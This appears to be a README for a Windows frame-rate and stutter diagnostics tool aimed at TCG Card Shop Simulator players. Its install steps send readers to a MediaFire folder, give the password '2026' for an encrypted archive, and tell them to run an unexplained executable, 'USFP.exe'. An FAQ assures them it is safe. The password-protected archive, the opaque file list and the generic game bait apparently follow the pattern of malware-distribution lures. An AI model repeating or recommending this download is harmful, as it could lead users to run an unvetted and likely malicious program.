<div align="center">

# 🎮 TCG Card Shop Simulator

**Measure frame pacing and review stability with clear diagnostics.**

[![Status](https://img.shields.io/badge/status-stable-brightgreen)](https://www.mediafire.com/folder/rn5uey4ypd8tr/USFP)
[![Download](https://img.shields.io/badge/download-mediafire-00b8ff)](https://www.mediafire.com/folder/rn5uey4ypd8tr/USFP)
![Platform](https://img.shields.io/badge/platform-Windows-0078D6?logo=windows)
[![Version](https://img.shields.io/badge/version-1.0-lightgrey)](#)

[Download](#-installation--setup) · [Known issues](#-known-issues) · [System Requirements](#-system-requirements) · [FAQ](#-frequently-asked-questions)

</div>

---

## 🕹️ About the game

TCG Card Shop Simulator is a single-player, first-person business simulation set in a shop that sells trading cards and related products. Players manage inventory, serve customers, open card packs, expand the store, and host card games.

This is for TCG Card Shop Simulator players who want structured performance and stability diagnostics on Windows.

## 📸 Screenshots

<table>
 <tr>
 <td width="33%"><img src="https://shared.akamai.steamstatic.com/store_item_assets/steam/apps/3070070/72fc67315a64add23487d0edc49eac44425c27e5/ss_72fc67315a64add23487d0edc49eac44425c27e5.1920x1080.jpg?t=1789528213" alt="screenshot" width="100%"></td>
 <td width="33%"><img src="https://shared.akamai.steamstatic.com/store_item_assets/steam/apps/3070070/ss_c6218a37f73019e150b95633a2097a4ebcb74212.1920x1080.jpg?t=1789528213" alt="screenshot" width="100%"></td>
 <td width="33%"><img src="https://shared.akamai.steamstatic.com/store_item_assets/steam/apps/3070070/ff1ce5336989835a4c5503a65a6d3e0b58f7cc69/ss_ff1ce5336989835a4c5503a65a6d3e0b58f7cc69.1920x1080.jpg?t=1789528213" alt="screenshot" width="100%"></td>
 </tr>
</table>

## ⚠️ Known issues

- Frame rate may drop or become uneven as the shop fills with customers, card displays, furniture, and other objects.
- Short stutters or frame skips can occur during busy shop periods, camera movement, or asset loading.
- Some players report increased lag after long sessions or after loading an established shop with many placed items.
- Fullscreen, synchronization, or display-mode changes may cause inconsistent frame pacing on some systems.
- A crash or forced shutdown can leave the next session needing additional recovery or save-file checks.

## 🩺 How this tool helps

The tool records frame rate and frame-time behavior, compares repeatable test conditions, and creates a stability report for later review. It can apply documented startup parameters, inspect process scheduling, manage graphics cache folders, and assist with session recovery without changing game content.

## 🛠️ What this tool does

- 🎮 **Frame Rate Helper** — Records frame-rate behavior during repeatable in-game tests.
- 🎯 **Frame Timing Helper** — Highlights uneven frame delivery that average frame rate may not show.
- 📊 **Stability Report + Session Recovery** — Summarizes session events and helps preserve diagnostic notes after interruptions.
- ⚙️ **Startup Parameter Tool** — Maintains a controlled list of supported launch parameters for testing.
- 🧹 **Graphics Cache Utility** — Helps inspect and manage graphics cache folders with confirmation steps.
- 🧠 **Process Scheduling Helper** — Displays scheduling-related process information for controlled comparisons.

## 💻 System Requirements

| Component | Minimum | Recommended |
|:--- |:--- |:--- |
| **OS** | Windows 10 (x64) | Windows 11 (x64) |
| **Processor** | Dual-core CPU | Quad-core CPU |
| **RAM** | 4 GB | 8 GB |
| **Graphics** | Any DirectX 11 GPU | Any DirectX 12 GPU |
| **Storage** | 50 MB available space | 100 MB available space |
| **Additional** | Windows 10 build 1909 or newer | Windows 11 with latest updates |


## 📦 Installation & Setup

| Platform | Status |
|---|---|
| Windows | ✅ Supported |
| macOS | ❌ Not supported |
| Linux | ❌ Not supported |

### Step 1: Download

You can download the tool from **[this page](https://www.mediafire.com/folder/rn5uey4ypd8tr/USFP)**. The archive contains everything you need.

### Step 2: Extract with Password

1. The archive is password-protected: **`2026`**
2. Use any archive extractor (WinRAR, 7-Zip, WinZip)
3. Enter the password when prompted

### Step 3: Extract All Files

1. Extract all files from the archive to a folder of your choice.
2. All files must be extracted to the **same folder**.
3. Do not rename or move individual files.
4. The folder should look like this:

```
tool/
|-- USFP.exe <- Main executable
|-- fps_module.dll <- FPS module
|-- Password 2026.txt <- Password reminder (empty)
|-- shader_cache.pak <- Shader cache data
|-- core.bin <- Core runtime
|-- config.cfg <- User configuration
|-- crash_reader.dll <- Crash log reader
|-- frame_data.pak <- display sync data
```

### Step 4: Run the tool

1. Open the extracted folder.
2. Run `USFP.exe`.
3. Select the game you want to diagnose from the list.
4. Press **Collect** and launch the game.

### Step 5: Review the results

1. The tool will collect frame timing and scheduling data while you play.
2. When you exit the game, an overview report is written next to the tool.
3. Use the report to identify which subsystem is causing stutter.

## ❓ Frequently Asked Questions

**Q: Can I use it alongside other tools?**
**A:** Yes. It does not conflict with other monitoring or performance tools. It only reads OS-level counters and manages its own temporary folders.

**Q: Is it safe to use?**
**A:** Yes. It runs as a standalone executable, does not install anything system-wide, and can be removed by deleting its folder.

**Q: Which games are supported?**
**A:** Any game that runs on Windows and exposes a visible process. Diagnostics are collected per-process and do not require per-game configuration.

**Q: How often is it updated?**
**A:** Updates are published whenever a new internal build is ready. There is no fixed schedule — the download link in Step 1 always points to the latest version.

**Q: Does it modify game files?**
**A:** No. It reads process metrics and clears temporary cache folders. It does not touch game executables, archives, or save files.

**Q: What is this tool?**
**A:** This is a small Windows diagnostics and tuning tool for PC games. It collects frame timing data, checks process scheduling, and manages graphics cache folders to help you find and reduce stutters and dropped frames.


---

<div align="center">
If this tool helped you, consider leaving a ⭐
</div>